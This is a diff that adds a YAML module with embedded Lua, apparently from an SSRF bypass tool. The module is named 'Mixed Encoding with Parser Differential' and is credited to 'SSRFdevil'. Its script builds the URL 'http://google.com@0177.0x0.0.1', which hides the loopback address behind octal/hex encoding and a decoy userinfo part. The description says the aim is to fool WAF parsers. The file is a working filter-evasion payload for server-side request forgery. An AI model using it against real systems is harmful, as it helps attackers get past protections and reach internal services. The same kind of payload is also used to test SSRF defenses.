@@ -1,0 +1,25 @@
+meta:
+  id: mixed_encoding_parser
+  version: 1
+  name: "Mixed Encoding with Parser Differential"
+  description: "Combines Octal/Hex and uses the @ character to fool WAF parsers"
+  author: "SSRFdevil"
+  created: "2026-06-20"
+  updated: "2026-06-20"
+  rank: 95
+  confidence: 90
+  severity: high
+  tags: [encoding, octal, hex, parser, bypass]
+  references: []
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [ipv4]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      local obfuscated_ip = "0177.0x0.0.1"
+      return { url = "http://google.com@" .. obfuscated_ip }
+    end
